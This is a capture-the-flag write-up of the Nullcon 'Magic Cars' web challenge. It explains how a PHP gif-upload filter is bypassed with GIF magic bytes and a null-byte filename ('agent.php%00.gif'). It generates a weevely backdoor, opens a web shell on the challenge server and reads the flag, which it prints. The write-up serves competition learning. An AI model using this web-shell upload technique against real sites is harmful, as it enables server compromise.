# Magic Cars

##  Description
 
...Writing after ctf ended so no access to challenge descriptions...

[http://52.59.124.14:10021/](http://52.59.124.14:10021/)

[Source](https://ctf.nullcon.net/files/15db6b81ee7cd7e76f50bfefd22acc79/source.zip?token=eyJ1c2VyX2lkIjo1ODEsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjMzfQ.ZOEfTA.Nuv6AjGbyXTP5JDYdwRykFjDy3E)

## Analysis

Given source doesnt contain much, 99% is just frontend. What we are interested is `index.php`

PHP code inside `index.php`:

```php
  <?php error_reporting(0); ?>
  <?php
    $files = $_FILES["fileToUpload"];
    $uploadOk = true;
    if ($files["name"] != "") {
        $target_dir = urldecode("images/" . $files["name"]);
        if (strpos($target_dir, "..") !== false) {
            $uploadOk = false;
        }
        if (filesize($files["tmp_name"]) > 1 * 1000) {
            $uploadOk = false;
            echo "too big!!!";
        }
        $extension = strtolower(pathinfo($target_dir, PATHINFO_EXTENSION));
        $finfo = finfo_open(FILEINFO_MIME_TYPE);
        $type = finfo_file($finfo, $files["tmp_name"]);
        finfo_close($finfo);
        if ($extension != "gif" || strpos($type, "image/gif") === false) {
            echo " Sorry, only gif files are accepted";
            $uploadOk = false;
        }
        $target_dir = strtok($target_dir, chr(0));
        if ($uploadOk && move_uploaded_file($files["tmp_name"], $target_dir)) {
            echo "<a href='$target_dir'>uploaded gif here go see it!</a>";
        }
    }
?>
```

We can upload files and view them. There's few restrictions:
1. Filename cant contain `..` (Prevents directory traversal)
2. File size cant exceed 1000kb
3. It has to be type of GIF
4. Extension must be a GIF

Type checking is easy to bypass due to [magic bytes](https://www.wikiwand.com/en/List_of_file_signatures), tricky part is `$extension`.

I found the attack vector on one of the [Hak5 Forum](https://forums.hak5.org/topic/39958-bypassing-pathinfo-or-getimagesize-php-shell-upload/)<br>
It says is that if you do `exploit.php%00.jpg` `pathinfo` will parse extension as `.jpg`, but actual filename is `exploit.php` due to NULL byte.

## Solution

I used [weevely](https://github.com/epinna/weevely3) to generate PHP payload.

```bash
└─$ weevely generate Password123$ agent.php%00.gif # Create Backdoor
Generated 'agent.php%00.gif' with password 'Password123$' of 781 byte size.
                                                                                                                                                                                                                  
└─$ sed -i '1s/^/GIF8;\n/' agent.php%00.gif # Add Magic Bytes
                                                                                                                                                                                                                  
└─$ file agent.php%00.gif # Check If GIF
agent.php%00.gif: GIF image data 16188 x 26736
```
::: info :information_source:
Wikipedia says that gif magic bytes are `GIF87a` or `GIF89a`. I learned `GIF8;` from [IppSec](https://ippsec.rocks/?#) and it works so... yeah.
:::

Upload.<br>
Response: `a href='images/agent.php'>uploaded gif here go see it!</a></body>`

Connect to backdoor:
```bash
└─$ weevely http://52.59.124.14:10021/images/agent.php Password123$

[+] weevely 4.0.1
[+] Target:     www-data@9a8170bf2def:/var/www/html
[+] Session:    /home/<>/.weevely/sessions/52.59.124.14/agent_0.session
[+] Shell:      System shell
[+] Browse the filesystem or execute commands starts the connection
[+] to the target. Type :help for more information.

www-data@9a8170bf2def:/var/www/html $ ls -alh
total 76K
drwxr-xr-x 1 root     www-data 4.0K Aug 18 22:29 .
drwxr-xr-x 1 root     root     4.0K Dec 11  2020 ..
-rwxr-xr-x 1 root     www-data  286 Aug 18 18:53 Dockerfile
-rwxr-xr-x 1 root     www-data 7.5K Aug 16 09:36 apache2.conf
drwxr-xr-x 1 root     www-data 4.0K Aug 16 09:36 css
-rwxr-xr-x 1 root     www-data  118 Aug 18 15:35 docker-compose.yml
-rwxr-xr-x 1 root     www-data   49 Aug 18 18:53 entrypoint.sh
-rwxr-xr-x 1 root     www-data   38 Aug 16 09:36 flag.flag
drwxr-xr-x 1 www-data www-data  12K Aug 20 07:10 images
-rwxr-xr-x 1 root     www-data 2.9K Aug 16 09:36 index.php
drwxr-xr-x 1 root     www-data 4.0K Aug 16 09:36 js
-rwxr-xr-x 1 root     www-data  463 Aug 18 18:53 script.sh

www-data@9a8170bf2def:/var/www/html $ cat flag.flag
ENO{4n_uplo4ded_f1l3_c4n_m4k3_wond3r5}
```
::: tip Flag
`ENO{4n_uplo4ded_f1l3_c4n_m4k3_wond3r5}`
:::